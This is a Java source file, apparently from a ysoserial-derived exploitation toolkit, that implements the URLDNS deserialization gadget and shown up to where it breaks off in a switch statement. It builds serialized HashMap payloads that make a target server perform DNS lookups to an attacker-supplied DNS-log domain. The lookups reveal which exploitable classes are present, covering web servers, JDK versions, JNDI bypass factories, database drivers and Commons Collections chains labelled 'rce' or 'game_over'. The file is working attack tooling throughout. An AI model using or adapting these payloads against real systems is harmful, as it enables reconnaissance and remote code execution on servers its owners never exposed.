package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;

/**
 * A blog post with more details about this gadget chain is at the url below:
 * <a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/">...</a>
 * <p>
 * This was inspired by  Philippe Arteau @h3xstream, who wrote a blog
 * posting describing how he modified the Java Commons Collections gadget
 * in ysoserial to open a URL. This takes the same idea, but eliminates
 * the dependency on Commons Collections and does a DNS lookup with just
 * standard JDK classes.
 * <p>
 * The Java URL class has an interesting property on its equals and
 * hashCode methods. The URL class will, as a side effect, do a DNS lookup
 * during a comparison (either equals or hashCode).
 * <p>
 * As part of deserialization, HashMap calls hashCode on each key that it
 * deserializes, so using a Java URL object as a serialized key allows
 * it to trigger a DNS lookup.
 * <p>
 * Gadget Chain:
 * HashMap.readObject()
 * HashMap.putVal()
 * HashMap.hash()
 * URL.hashCode()
 */

@SuppressWarnings({"unused"})
@Dependencies()
@Authors({Authors.GEBL})
public class URLDNS implements ObjectPayload<Object> {
    private static final Logger log = LogManager.getLogger(URLDNS.class);
    public static String[] defaultClass = new String[]{
            "CommonsCollections13567",
            "CommonsCollections24",
            "C3P0",
            "AspectJWeaver",
            "bsh",
            "Groovy",
            "Becl",
            "Jdk7u21",
            "JRE8u20",
            "ROME",
            "Jackson",
            "SpringAOP",
            "winlinux",
            "jdk17_22",
            "jdk9_22",
            "jdk6_8",
            "jdk6_11",
            "jdk9_10",
            "cb",
            "db",
            "datasource",
            "jndiAttack",
            "other",
            "gadget",
            "jdk",
            "web"
    };


    public static List<Object> list = new LinkedList<>();

    public static Object getURLDNSGadget(String urls, String clazzName) throws Exception {
        HashMap<Object, Object> hashMap = new HashMap<>();
        URL url = new URL("http://" + urls);
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, 0);
        Class<?> clazz = null;

        if (clazzName != null) {
            try {
                clazz = com.qi4l.JYso.gadgets.utils.Utils.makeClass(clazzName);
            } catch (Exception e) {
                clazz = Class.forName(clazzName);
            }
        }

        hashMap.put(url, clazz);
        f.set(url, -1);
        return hashMap;
    }

    public static void setList(String clazzName, String dnsLog) throws Exception {


        switch (clazzName) {
            case "web":
                Object tomcat_webserver = getURLDNSGadget("tomcat_webserver." + dnsLog, "org.apache.catalina.startup.Catalina");
                list.add(tomcat_webserver);
                Object javax_servlet_tomcat9 = getURLDNSGadget("javax_servlet_tomcat9." + dnsLog, "javax.servlet.http.HttpServlet");
                list.add(javax_servlet_tomcat9);
                Object jakarta_servlet_tomcat10 = getURLDNSGadget("jakarta_servlet_tomcat10." + dnsLog, "jakarta.servlet.http.HttpServlet");
                list.add(jakarta_servlet_tomcat10);
                Object weblogic_webserver = getURLDNSGadget("weblogic_webserver." + dnsLog, "weblogic.servlet.internal.WebAppModule");
                list.add(weblogic_webserver);
                Object resin_webserver = getURLDNSGadget("resin_webserver." + dnsLog, "com.caucho.server.resin.Resin");
                list.add(resin_webserver);
                Object jetty_webserver = getURLDNSGadget("jetty_webserver." + dnsLog, "org.eclipse.jetty.server.Server");
                list.add(jetty_webserver);
                Object websphere_webserver = getURLDNSGadget("websphere_webserver." + dnsLog, "com.ibm.wsspi.sib.core.exception.SINotAuthorizedException");
                list.add(websphere_webserver);
                Object undertow_webserver = getURLDNSGadget("undertow_webserver." + dnsLog, "io.undertow.server.Connectors");
                list.add(undertow_webserver);
                Object glassfish_webserver = getURLDNSGadget("glassfish_webserver." + dnsLog, "org.glassfish.jersey.server.ContainerException");
                list.add(glassfish_webserver);
                Object tongweb_webserver1 = getURLDNSGadget("tongweb_webserver1." + dnsLog, "com.tongweb.catalina.core.StandardHost");
                list.add(tongweb_webserver1);
                Object tongweb_webserver2 = getURLDNSGadget("tongweb_webserver2." + dnsLog, "com.tongweb.catalina.startup.ThanosCatalina");
                list.add(tongweb_webserver2);
                Object tongweb_webserver3 = getURLDNSGadget("tongweb_webserver3." + dnsLog, "com.tongweb.catalina.startup.Bootstrap");
                list.add(tongweb_webserver3);
                Object bes_webserver = getURLDNSGadget("bes_webserver." + dnsLog, "com.bes.enterprise.webtier.LifecycleException");
                list.add(bes_webserver);
                Object cvicse_webserver = getURLDNSGadget("cvicse_webserver." + dnsLog, "com.cvicse.enterprise.connectors.ConnectorRuntime");
                list.add(cvicse_webserver);
                Object primeton_webserver = getURLDNSGadget("primeton_webserver." + dnsLog, "com.primeton.appserver.enterprise.v3.common.XMLContentActionReporter");
                list.add(primeton_webserver);
                Object apusic_webserver = getURLDNSGadget("apusic_webserver." + dnsLog, "com.apusic.web.container.WebContainer");
                list.add(apusic_webserver);
                Object kingdee_webserver = getURLDNSGadget("kingdee_webserver." + dnsLog, "com.kingdee.eas.hse.scm.service.app.OnlineOrderInterface");
                list.add(kingdee_webserver);
                break;
            case "jdk":
                Object jdk_17_to_22 = getURLDNSGadget("jdk_17_to_22." + dnsLog, "jdk.internal.util.random.RandomSupport");
                list.add(jdk_17_to_22);
                Object jdk_9_to_22_Unsafe = getURLDNSGadget("jdk_9_to_22_Unsafe." + dnsLog, "jdk.internal.misc.Unsafe");
                list.add(jdk_9_to_22_Unsafe);
                Object jdk_le_8_BASE64Decoder = getURLDNSGadget("jdk_le_8_BASE64Decoder." + dnsLog, "sun.misc.BASE64Decoder");
                list.add(jdk_le_8_BASE64Decoder);
                Object jdk_6_to_11 = getURLDNSGadget("jdk_6_to_11." + dnsLog, "com.sun.awt.SecurityWarning");
                list.add(jdk_6_to_11);
                Object jdk_9_to_10 = getURLDNSGadget("jdk_9_to_10." + dnsLog, "jdk.incubator.http.HttpClient");
                list.add(jdk_9_to_10);
                Object jdk8_Base64 = getURLDNSGadget("jdk8_Base64." + dnsLog, "java.util.Base64");
                list.add(jdk8_Base64);
                Object jdk_xml_utils_Base64 = getURLDNSGadget("jdk_xml_utils_Base64." + dnsLog, "com.sun.org.apache.xml.internal.security.utils.Base64");
                list.add(jdk_xml_utils_Base64);
                Object jrmp = getURLDNSGadget("jrmp." + dnsLog, "java.rmi.server.UnicastRemoteObject");
                list.add(jrmp);
                Object Runtime = getURLDNSGadget("Runtime." + dnsLog, "java.lang.Runtime");
                list.add(Runtime);
                Object ProcessBuilder = getURLDNSGadget("ProcessBuilder." + dnsLog, "java.lang.ProcessBuilder");
                list.add(ProcessBuilder);
                Object activej_DefiningClassLoader = getURLDNSGadget("activej_DefiningClassLoader." + dnsLog, "io.activej.codegen.DefiningClassLoader");
                list.add(activej_DefiningClassLoader);
                Object bcel = getURLDNSGadget("bcel." + dnsLog, "com.sun.org.apache.bcel.internal.util.ClassLoader");
                list.add(bcel);
                Object cc_bypass_DefiningClassLoader = getURLDNSGadget("cc_bypass_DefiningClassLoader." + dnsLog, "sun.org.mozilla.javascript.internal.DefiningClassLoader");
                list.add(cc_bypass_DefiningClassLoader);
                Object cc_bypass_DefiningClassLoader2 = getURLDNSGadget("cc_bypass_DefiningClassLoader2." + dnsLog, "org.mozilla.javascript.DefiningClassLoader");
                list.add(cc_bypass_DefiningClassLoader2);
                Object xalan_TemplatesImpl = getURLDNSGadget("xalan_TemplatesImpl." + dnsLog, "org.apache.xalan.xsltc.trax.TemplatesImpl");
                list.add(xalan_TemplatesImpl);
                Object jdk_TemplatesImpl = getURLDNSGadget("jdk_TemplatesImpl." + dnsLog, "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
                list.add(jdk_TemplatesImpl);
                break;
            case "gadget":
                Object BadAttributeValueExpException = getURLDNSGadget("BadAttributeValueExpException." + dnsLog, "javax.management.BadAttributeValueExpException");
                list.add(BadAttributeValueExpException);
                Object jackson_POJONode = getURLDNSGadget("jackson_POJONode." + dnsLog, "com.fasterxml.jackson.databind.node.POJONode");
                list.add(jackson_POJONode);
                Object fastjson = getURLDNSGadget("fastjson." + dnsLog, "com.alibaba.fastjson.JSONArray");
                list.add(fastjson);
                Object fastjson2 = getURLDNSGadget("fastjson2." + dnsLog, "com.alibaba.fastjson2.JSONArray");
                list.add(fastjson2);
                Object UnicastRef = getURLDNSGadget("UnicastRef." + dnsLog, "sun.rmi.server.UnicastRef");
                list.add(UnicastRef);
                Object fileupload_DiskFileItem = getURLDNSGadget("fileupload_DiskFileItem." + dnsLog, "org.apache.commons.fileupload.disk.DiskFileItem");
                list.add(fileupload_DiskFileItem);
                Object fileupload_FileItem = getURLDNSGadget("fileupload_FileItem." + dnsLog, "org.apache.commons.fileupload.FileItem");
                list.add(fileupload_FileItem);
                Object cc_TreeBag = getURLDNSGadget("cc_TreeBag." + dnsLog, "org.apache.commons.collections.bag.TreeBag");
                list.add(cc_TreeBag);
                Object SignedObject = getURLDNSGadget("SignedObject." + dnsLog, "java.security.SignedObject");
                list.add(SignedObject);
                Object MapMessage = getURLDNSGadget("MapMessage." + dnsLog, "org.apache.catalina.tribes.tipis.AbstractReplicatedMap$MapMessage");
                list.add(MapMessage);
                Object weblogic_gadget = getURLDNSGadget("weblogic_gadget." + dnsLog, "oracle.ucp.jdbc.PoolDataSourceImpl");
                list.add(weblogic_gadget);
                Object spring_aop1_for_jackson = getURLDNSGadget("spring_aop1_for_jackson." + dnsLog, "org.springframework.aop.framework.AdvisedSupport");
                list.add(spring_aop1_for_jackson);
                Object spring_aop2_for_jackson = getURLDNSGadget("spring_aop2_for_jackson." + dnsLog, "org.springframework.aop.framework.JdkDynamicAopProxy");
                list.add(spring_aop2_for_jackson);
                Object jdk9_jshell = getURLDNSGadget("jdk9_jshell." + dnsLog, "jdk.jshell.JShell");
                list.add(jdk9_jshell);
                Object jdk9 = getURLDNSGadget("jdk9." + dnsLog, "jdk.internal.loader.ClassLoaders$AppClassLoader");
                list.add(jdk9);
                Object jxpath_gadget = getURLDNSGadget("jxpath_gadget." + dnsLog, "org.apache.commons.jxpath.ri.model.NodePointer");
                list.add(jxpath_gadget);
                Object ASeq_gadget = getURLDNSGadget("ASeq_gadget." + dnsLog, "clojure.lang.ASeq");
                list.add(ASeq_gadget);
                Object Page_gadget = getURLDNSGadget("Page_gadget." + dnsLog, "org.htmlparser.lexer.Page");
                list.add(Page_gadget);
                Object tomcat_dbcp_getter1 = getURLDNSGadget("tomcat_dbcp_getter1." + dnsLog, "org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource");
                list.add(tomcat_dbcp_getter1);
                Object tomcat_dbcp_getter2 = getURLDNSGadget("tomcat_dbcp_getter2." + dnsLog, "org.apache.tomcat.dbcp.dbcp.datasources.PerUserPoolDataSource");
                list.add(tomcat_dbcp_getter2);
                Object tomcat_dbcp2_getter1 = getURLDNSGadget("tomcat_dbcp2_getter1." + dnsLog, "org.apache.tomcat.dbcp.dbcp2.datasources.SharedPoolDataSource");
                list.add(tomcat_dbcp2_getter1);
                Object tomcat_dbcp2_getter2 = getURLDNSGadget("tomcat_dbcp2_getter2." + dnsLog, "org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource");
                list.add(tomcat_dbcp2_getter2);
                Object postgresql_getter = getURLDNSGadget("postgresql_getter." + dnsLog, "org.postgresql.ds.PGConnectionPoolDataSource");
                list.add(postgresql_getter);
                Object mysql_getter = getURLDNSGadget("mysql_getter." + dnsLog, "com.mysql.jdbc.jdbc2.optional.MysqlDataSource");
                list.add(mysql_getter);
                Object druid_getter1_DruidDataSource = getURLDNSGadget("druid_getter1_DruidDataSource." + dnsLog, "com.alibaba.druid.pool.DruidDataSource");
                list.add(druid_getter1_DruidDataSource);
                Object druid_getter2_DruidQuartzConnectionProvider = getURLDNSGadget("druid_getter2_DruidQuartzConnectionProvider." + dnsLog, "com.alibaba.druid.support.quartz.DruidQuartzConnectionProvider");
                list.add(druid_getter2_DruidQuartzConnectionProvider);
                Object druid_getter3_DruidXADataSource = getURLDNSGadget("druid_getter3_DruidXADataSource." + dnsLog, "com.alibaba.druid.pool.xa.DruidXADataSource");
                list.add(druid_getter3_DruidXADataSource);
                Object common_dbcp_getter1 = getURLDNSGadget("common_dbcp_getter1." + dnsLog, "org.apache.commons.dbcp.datasources.SharedPoolDataSource");
                list.add(common_dbcp_getter1);
                Object common_dbcp_getter2 = getURLDNSGadget("common_dbcp_getter2." + dnsLog, "org.apache.commons.dbcp.datasources.PerUserPoolDataSource");
                list.add(common_dbcp_getter2);
                Object common_dbcp2_getter1 = getURLDNSGadget("common_dbcp2_getter1." + dnsLog, "org.apache.commons.dbcp2.datasources.SharedPoolDataSource");
                list.add(common_dbcp2_getter1);
                Object common_dbcp2_getter2 = getURLDNSGadget("common_dbcp2_getter2." + dnsLog, "org.apache.commons.dbcp2.datasources.PerUserPoolDataSource");
                list.add(common_dbcp2_getter2);
                Object spring_aop_HotSwappableTargetSource = getURLDNSGadget("spring_aop_HotSwappableTargetSource." + dnsLog, "org.springframework.aop.target.HotSwappableTargetSource");
                list.add(spring_aop_HotSwappableTargetSource);
                Object resin_qname_rce = getURLDNSGadget("resin_qname_rce." + dnsLog, "com.caucho.naming.QName");
                list.add(resin_qname_rce);
                break;
            case "other":
                Object spel = getURLDNSGadget("spel." + dnsLog, "org.springframework.expression.spel.standard.SpelExpressionParser");
                list.add(spel);
                Object commons_KeyedObjectPoolFactory = getURLDNSGadget("commons_KeyedObjectPoolFactory." + dnsLog, "org.apache.commons.pool.KeyedObjectPoolFactory");
                list.add(commons_KeyedObjectPoolFactory);
                Object tomcat_PooledObjectFactory = getURLDNSGadget("tomcat_PooledObjectFactory." + dnsLog, "org.apache.commons.pool2.PooledObjectFactory");
                list.add(tomcat_PooledObjectFactory);
                Object hibernate_rce = getURLDNSGadget("hibernate_rce." + dnsLog, "org.hibernate.jmx.StatisticsService");
                list.add(hibernate_rce);
                Object mysql_MiniAdmin = getURLDNSGadget("mysql_MiniAdmin." + dnsLog, "com.mysql.cj.jdbc.admin.MiniAdmin");
                list.add(mysql_MiniAdmin);
                Object OracleCachedRowSet_jndi = getURLDNSGadget("OracleCachedRowSet_jndi." + dnsLog, "oracle.jdbc.rowset.OracleCachedRowSet");
                list.add(OracleCachedRowSet_jndi);
                Object oracle_jdbcrowset = getURLDNSGadget("oracle_jdbcrowset." + dnsLog, "oracle.jdbc.rowset.OracleJDBCRowSet");
                list.add(oracle_jdbcrowset);
                Object dameng_DmdbRowSet = getURLDNSGadget("dameng_DmdbRowSet." + dnsLog, "dm.jdbc.driver.DmdbRowSet");
                list.add(dameng_DmdbRowSet);
                Object jboss_rce = getURLDNSGadget("jboss_rce." + dnsLog, "org.jboss.util.propertyeditor.DocumentEditor");
                list.add(jboss_rce);
                Object myfaces_rce = getURLDNSGadget("myfaces_rce." + dnsLog, "org.apache.myfaces.view.facelets.el.ValueExpressionMethodExpression");
                list.add(myfaces_rce);
                Object jython_rce = getURLDNSGadget("jython_rce." + dnsLog, "org.python.core.PyBytecode.PyBytecode");
                list.add(jython_rce);
                Object rome_rce = getURLDNSGadget("rome_rce." + dnsLog, "com.sun.syndication.feed.impl.ObjectBean");
                list.add(rome_rce);
                Object vaadin_rce = getURLDNSGadget("vaadin_rce." + dnsLog, "com.vaadin.data.util.PropertysetItem");
                list.add(vaadin_rce);
                Object wicket_rce = getURLDNSGadget("wicket_rce." + dnsLog, "org.apache.wicket.util.upload.DiskFileItem");
                list.add(wicket_rce);
                Object rhino_js_rce = getURLDNSGadget("rhino_js_rce." + dnsLog, "org.mozilla.javascript.NativeError");
                list.add(rhino_js_rce);
                Object hibernate_Getter = getURLDNSGadget("hibernate_Getter." + dnsLog, "org.hibernate.property.Getter");
                list.add(hibernate_Getter);
                Object hibernate_TypedValue = getURLDNSGadget("hibernate_TypedValue." + dnsLog, "org.hibernate.engine.spi.TypedValue");
                list.add(hibernate_TypedValue);
                Object net_sf_json_rce = getURLDNSGadget("net_sf_json_rce." + dnsLog, "net.sf.json.JSONObject");
                list.add(net_sf_json_rce);
                Object clojure_rce = getURLDNSGadget("clojure_rce." + dnsLog, "clojure.lang.PersistentArrayMap");
                list.add(clojure_rce);
                Object click_rce = getURLDNSGadget("click_rce." + dnsLog, "org.apache.click.control.Table");
                list.add(click_rce);
                Object WildFly_rce = getURLDNSGadget("WildFly_rce." + dnsLog, "org.jboss.as.connector.subsystems.datasources.WildFlyDataSource");
                list.add(WildFly_rce);
                Object WildFly_rce1 = getURLDNSGadget("WildFly_rce1." + dnsLog, "org.apache.batik.swing.JSVGCanvas");
                list.add(WildFly_rce1);
                Object hibernate_core_4 = getURLDNSGadget("hibernate_core_4.x." + dnsLog, "org.hibernate.service.jdbc.connections.internal.DriverManagerConnectionProviderImpl");
                list.add(hibernate_core_4);
                Object tomcat9_not_version8 = getURLDNSGadget("tomcat9_not_version8." + dnsLog, "org.apache.catalina.util.ToStringUtil");
                list.add(tomcat9_not_version8);
                Object log4j_jndi = getURLDNSGadget("log4j_jndi." + dnsLog, "org.apache.log4j.receivers.dbMap.JNDIConnectionSource");
                list.add(log4j_jndi);
                Object log4j_driver = getURLDNSGadget("log4j_driver." + dnsLog, "org.apache.log4j.receivers.dbMap.DriverManagerConnectionSource");
                list.add(log4j_driver);
                Object jdbcRowSet = getURLDNSGadget("jdbcRowSet." + dnsLog, "com.sun.rowset.JdbcRowSetImpl");
                list.add(jdbcRowSet);
                Object ibatis_jndi = getURLDNSGadget("ibatis_jndi." + dnsLog, "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory");
                list.add(ibatis_jndi);
                Object ibatis_XPathParser = getURLDNSGadget("ibatis_XPathParser." + dnsLog, "org.apache.ibatis.parsing.XPathParser");
                list.add(ibatis_XPathParser);
                Object LogFactory = getURLDNSGadget("LogFactory." + dnsLog, "org.apache.juli.logging.LogFactory");
                list.add(LogFactory);
                Object MXParser = getURLDNSGadget("MXParser." + dnsLog, "org.xmlpull.mxp1.MXParser");
                list.add(MXParser);
                Object XmlPullParserException = getURLDNSGadget("XmlPullParserException." + dnsLog, "org.xmlpull.v1.XmlPullParserException");
                list.add(XmlPullParserException);
                break;
            case "jndiAttack":
                Object BeanFactory_game_over = getURLDNSGadget("BeanFactory_game_over." + dnsLog, "org.apache.catalina.filters.CsrfPreventionFilter$NonceCache");
                Object BeanFactory_yes = getURLDNSGadget("BeanFactory_yes." + dnsLog, "org.apache.naming.factory.BeanFactory");
                Object bes_BeanFactory = getURLDNSGadget("bes_BeanFactory." + dnsLog, "com.bes.enterprise.naming.factory.BeanFactory");
                Object el = getURLDNSGadget("el." + dnsLog, "javax.el.ELProcessor");
                Object groovy = getURLDNSGadget("groovy." + dnsLog, "groovy.lang.GroovyShell");
                Object BurlapProxyFactory_ObjectFactory = getURLDNSGadget("BurlapProxyFactory_ObjectFactory." + dnsLog, "com.caucho.burlap.client.BurlapProxyFactory");
                Object MemoryUserDatabaseFactory_ObjectFactory = getURLDNSGadget("MemoryUserDatabaseFactory_ObjectFactory." + dnsLog, "org.apache.catalina.users.MemoryUserDatabaseFactory");
                Object UserDatabase = getURLDNSGadget("UserDatabase." + dnsLog, "org.apache.catalina.UserDatabase");
                Object GenericNamingResourcesFactory_ObjectFactory = getURLDNSGadget("GenericNamingResourcesFactory_ObjectFactory." + dnsLog, "org.apache.tomcat.jdbc.naming.GenericNamingResourcesFactory");
                Object Configuration_modify_system_property = getURLDNSGadget("Configuration_modify_system_property." + dnsLog, "org.apache.commons.configuration.SystemConfiguration");
                Object Configuration2_modify_system_property = getURLDNSGadget("Configuration2_modify_system_property." + dnsLog, "org.apache.commons.configuration2.SystemConfiguration");
                Object groovy_modify_system_env = getURLDNSGadget("groovy_modify_system_env." + dnsLog, "org.apache.groovy.util.SystemUtil");
                Object ibm_ObjectFactory = getURLDNSGadget("ibm_ObjectFactory." + dnsLog, "com.ibm.ws.webservices.engine.client.ServiceFactory");
                Object ibm_ObjectFactory2 = getURLDNSGadget("ibm_ObjectFactory2." + dnsLog, "com.ibm.ws.client.applicationclient.ClientJ2CCFFactory");
                Object snakeyaml = getURLDNSGadget("snakeyaml." + dnsLog, "org.yaml.snakeyaml.Yaml");
                Object xstream = getURLDNSGadget("xstream." + dnsLog, "com.thoughtworks.xstream.XStream");
                Object mvel2_ShellSession = getURLDNSGadget("mvel2_ShellSession." + dnsLog, "org.mvel2.sh.ShellSession");
                Object mvel2 = getURLDNSGadget("mvel2." + dnsLog, "org.mvel2.MVEL");
                Object jexl2 = getURLDNSGadget("jexl2." + dnsLog, "org.apache.commons.jexl2.JexlParser");
                Object jexl3 = getURLDNSGadget("jexl3." + dnsLog, "org.apache.commons.jexl3.scripting.JexlScriptEngine");
                Object ognl = getURLDNSGadget("ognl." + dnsLog, "com.opensymphony.xwork2.ActionSupport");
                Object NativeLibLoader = getURLDNSGadget("NativeLibLoader." + dnsLog, "com.sun.glass.utils.NativeLibLoader");
                Object velocity_jndi_write = getURLDNSGadget("velocity_jndi_write." + dnsLog, "org.apache.velocity.texen.util.FileUtil");
                Object h2_create_dir = getURLDNSGadget("h2_create_dir." + dnsLog, "org.h2.store.fs.FileUtils");
                Object websphere_jar_rce_ClientJ2CCFFactory = getURLDNSGadget("websphere_jar_rce_ClientJ2CCFFactory." + dnsLog, "com.ibm.ws.client.applicationclient.ClientJ2CCFFactory");
                Object websphere_jar_rce_ServiceFactory = getURLDNSGadget("websphere_jar_rce_ServiceFactory." + dnsLog, "com.ibm.ws.client.applicationclient.ServiceFactory");
                Object PropertiesConfiguration = getURLDNSGadget("PropertiesConfiguration." + dnsLog, "org.apache.commons.configuration.PropertiesConfiguration");
                list.add(BeanFactory_game_over);
                list.add(BeanFactory_yes);
                list.add(bes_BeanFactory);
                list.add(el);
                list.add(groovy);
                list.add(BurlapProxyFactory_ObjectFactory);
                list.add(MemoryUserDatabaseFactory_ObjectFactory);
                list.add(UserDatabase);
                list.add(GenericNamingResourcesFactory_ObjectFactory);
                list.add(Configuration_modify_system_property);
                list.add(Configuration2_modify_system_property);
                list.add(groovy_modify_system_env);
                list.add(ibm_ObjectFactory);
                list.add(ibm_ObjectFactory2);
                list.add(snakeyaml);
                list.add(xstream);
                list.add(mvel2_ShellSession);
                list.add(mvel2);
                list.add(jexl2);
                list.add(jexl3);
                list.add(ognl);
                list.add(NativeLibLoader);
                list.add(velocity_jndi_write);
                list.add(h2_create_dir);
                list.add(websphere_jar_rce_ClientJ2CCFFactory);
                list.add(websphere_jar_rce_ServiceFactory);
                list.add(PropertiesConfiguration);
                break;
            case "datasource":
                Object jndi_factory_bypass_alibaba_druid = getURLDNSGadget("jndi_factory_bypass_alibaba_druid." + dnsLog, "com.alibaba.druid.pool.DruidDataSourceFactory");
                list.add(jndi_factory_bypass_alibaba_druid);
                Object jndi_factory_bypass_tomcat7_and_dbcp1 = getURLDNSGadget("jndi_factory_bypass_tomcat7_and_dbcp1." + dnsLog, "org.apache.tomcat.dbcp.dbcp1.BasicDataSource");
                list.add(jndi_factory_bypass_tomcat7_and_dbcp1);
                Object jndi_factory_bypass_tomcat8_and_dbcp2 = getURLDNSGadget("jndi_factory_bypass_tomcat8_and_dbcp2." + dnsLog, "org.apache.tomcat.dbcp.dbcp2.BasicDataSource");
                list.add(jndi_factory_bypass_tomcat8_and_dbcp2);
                Object jndi_factory_bypass_common_dbcp = getURLDNSGadget("jndi_factory_bypass_common_dbcp." + dnsLog, "org.apache.commons.dbcp.BasicDataSourceFactory");
                list.add(jndi_factory_bypass_common_dbcp);
                Object jndi_factory_bypass_common_dbcp2 = getURLDNSGadget("jndi_factory_bypass_common_dbcp2." + dnsLog, "org.apache.commons.dbcp2.BasicDataSourceFactory");
                list.add(jndi_factory_bypass_common_dbcp2);
                Object jndi_factory_bypass_tomcat_jdbc = getURLDNSGadget("jndi_factory_bypass_tomcat_jdbc." + dnsLog, "org.apache.tomcat.jdbc.pool.DataSourceFactory");
                list.add(jndi_factory_bypass_tomcat_jdbc);
                Object jndi_spring = getURLDNSGadget("jndi_spring." + dnsLog, "org.springframework.beans.factory.config.PropertyPathFactoryBean");
                list.add(jndi_spring);
                Object HikariJNDIFactory_DataSource = getURLDNSGadget("HikariJNDIFactory_DataSource." + dnsLog, "com.zaxxer.hikari.HikariJNDIFactory");
                list.add(HikariJNDIFactory_DataSource);
                Object teradata_DataSource = getURLDNSGadget("teradata_DataSource." + dnsLog, "com.teradata.jdbc.TeraDataSource");
                list.add(teradata_DataSource);
                break;
            case "db":
                Object mysql_driver = getURLDNSGadget("mysql_driver." + dnsLog, "com.mysql.jdbc.Driver");
                Object mysql_cj_driver = getURLDNSGadget("mysql_cj_driver." + dnsLog, "com.mysql.cj.jdbc.Driver");
                Object postgresql_driver = getURLDNSGadget("postgresql_driver." + dnsLog, "org.postgresql.Driver");
                Object hsqldb_driver = getURLDNSGadget("hsqldb_driver." + dnsLog, "org.hsqldb.jdbcDriver");
                Object h2_driver = getURLDNSGadget("h2_driver." + dnsLog, "org.h2.Driver");
                Object sqlite_driver = getURLDNSGadget("sqlite_driver." + dnsLog, "org.sqlite.JDBC");
                Object derby_driver = getURLDNSGadget("derby_driver." + dnsLog, "org.apache.derby.jdbc.EmbeddedDriver");
                Object teradata_drvier = getURLDNSGadget("teradata_drvier." + dnsLog, "com.teradata.jdbc.TeraDriver");
                Object db2_driver = getURLDNSGadget("db2_driver." + dnsLog, "COM.ibm.db2.jcc.DB2Driver");
                Object modeshape_driver = getURLDNSGadget("modeshape_driver." + dnsLog, "org.modeshape.jdbc.LocalJcrDriver");
                Object fabric_driver = getURLDNSGadget("fabric_driver." + dnsLog, "com.mysql.fabric.jdbc.FabricMySQLDriver");
                Object dm_driver = getURLDNSGadget("dm_driver." + dnsLog, "dm.jdbc.driver.DmDriver");
                Object sqlserver_driver = getURLDNSGadget("sqlserver_driver." + dnsLog, "com.microsoft.sqlserver.jdbc.SQLServerDriver");
                Object microsoft_driver = getURLDNSGadget("microsoft_driver." + dnsLog, "com.microsoft.jdbc.sqlserver.SQLServerDriver");
                Object oracle_driver = getURLDNSGadget("oracle_driver." + dnsLog, "oracle.jdbc.OracleDriver");
                Object oracle_driver2 = getURLDNSGadget("oracle_driver2." + dnsLog, "oracle.jdbc.driver.OracleDriver");
                Object jtds_driver = getURLDNSGadget("jtds_driver." + dnsLog, "net.sourceforge.jtds.jdbc.Driver");
                Object mariadb_driver = getURLDNSGadget("mariadb_driver." + dnsLog, "org.mariadb.jdbc.Driver");
                Object kingbase_driver = getURLDNSGadget("kingbase_driver." + dnsLog, "com.kingbase.Driver");
                Object kingbase8_driver = getURLDNSGadget("kingbase8_driver." + dnsLog, "com.kingbase8.Driver");
                Object shen_tong_driver = getURLDNSGadget("shen_tong_driver." + dnsLog, "com.oscar.Driver");
                Object Gbase8s_driver = getURLDNSGadget("Gbase8s_driver." + dnsLog, "com.gbasedbt.jdbc.Driver");
                Object xugu_driver = getURLDNSGadget("xugu_driver." + dnsLog, "com.xugu.cloudjdbc.Driver");
                Object GoldenDB_driver = getURLDNSGadget("GoldenDB_driver." + dnsLog, "com.goldendb.jdbc.Driver");
                list.add(mysql_driver);
                list.add(mysql_cj_driver);
                list.add(postgresql_driver);
                list.add(hsqldb_driver);
                list.add(h2_driver);
                list.add(sqlite_driver);
                list.add(derby_driver);
                list.add(teradata_drvier);
                list.add(db2_driver);
                list.add(modeshape_driver);
                list.add(fabric_driver);
                list.add(dm_driver);
                list.add(sqlserver_driver);
                list.add(microsoft_driver);
                list.add(oracle_driver);
                list.add(oracle_driver2);
                list.add(jtds_driver);
                list.add(mariadb_driver);
                list.add(kingbase_driver);
                list.add(kingbase8_driver);
                list.add(shen_tong_driver);
                list.add(Gbase8s_driver);
                list.add(xugu_driver);
                list.add(GoldenDB_driver);
                break;
            case "cb":
                Object cb17 = getURLDNSGadget("cb17." + dnsLog, "org.apache.commons.beanutils.MappedPropertyDescriptor$1");
                Object cb18 = getURLDNSGadget("cb18." + dnsLog, "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry");
                Object cb19 = getURLDNSGadget("cb19." + dnsLog, "org.apache.commons.beanutils.BeanIntrospectionData");
                Object cb_BeanComparator = getURLDNSGadget("cb_BeanComparator." + dnsLog, "org.apache.commons.beanutils.BeanComparator");
                list.add(cb17);
                list.add(cb18);
                list.add(cb19);
                list.add(cb_BeanComparator);
                break;
            case "CommonsCollections13567":
                //CommonsCollections1/3/5/6/7链,需要<=3.2.1版本
                Object cc3_ChainedTransformer = getURLDNSGadget("cc3_ChainedTransformer." + dnsLog, "org.apache.commons.collections.functors.ChainedTransformer");
                Object cc31 = getURLDNSGadget("cc31." + dnsLog, "org.apache.commons.collections.list.TreeList");
                Object cc4_exist = getURLDNSGadget("cc4_exist." + dnsLog, "org.apache.commons.collections4.comparators.TransformingComparator");
                Object cc40_ChainedTransformer = getURLDNSGadget("cc40_ChainedTransformer." + dnsLog, "org.apache.commons.collections4.functors.ChainedTransformer");
                Object cc322 = getURLDNSGadget("cc322." + dnsLog, "org.apache.commons.collections.ExtendedProperties$1");
                Object cc41_game_over = getURLDNSGadget("cc41_game_over." + dnsLog, "org.apache.commons.collections4.FluentIterable");
                list.add(cc3_ChainedTransformer);
                list.add(cc322);
                list.add(cc4_exist);
                list.add(cc40_ChainedTransformer);
                list.add(cc41_game_over);
                list.add(cc31);
                break;
            case "CommonsCollections24":
                //CommonsCollections2/4链,需要4-4.0版本
                Object cc40 = getURLDNSGadget("cc40." + dnsLog, "org.apache.commons.collections4.functors.ChainedTransformer");
                Object cc41 = getURLDNSGadget("cc41." + dnsLog, "org.apache.commons.collections4.FluentIterable");
                list.add(cc40);
                list.add(cc41);
                break;
            case "C3P0":
